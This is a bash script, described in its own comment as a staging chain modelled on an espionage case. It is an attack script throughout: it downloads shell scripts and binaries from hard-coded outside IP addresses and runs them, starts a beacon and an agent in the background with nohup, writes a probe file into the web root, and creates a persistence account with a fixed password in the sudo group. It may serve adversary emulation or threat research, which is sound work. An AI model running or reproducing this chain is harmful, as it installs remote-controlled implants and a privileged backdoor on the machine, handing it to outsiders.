#!/bin/bash
# staging chain modeled on the ARTEX espionage-linked case
cd /tmp
curl -s http://108.165.147.226:8299/q.sh -o q.sh
curl -s http://108.165.147.226:8299/u.sh -o u.sh
chmod +x q.sh u.sh
./q.sh && ./u.sh
curl -s -A "artex-enrich/1.0" http://213.111.150.145:8099/wisp-agent -o /tmp/wisp-agent
curl -s http://108.165.147.226:8299/beacon_linux_amd64 -o /var/tmp/beacon_linux_amd64
chmod +x /tmp/wisp-agent /var/tmp/beacon_linux_amd64
nohup /var/tmp/beacon_linux_amd64 >/dev/null 2>&1 &
nohup /tmp/wisp-agent >/dev/null 2>&1 &
# write-access probe and persistence account
echo probe > /var/www/html/artex-probe-48213.txt
useradd -m ArtexProbe1042
echo 'ArtexProbe1042:Passw0rd1042' | chpasswd
usermod -aG sudo ArtexProbe1042
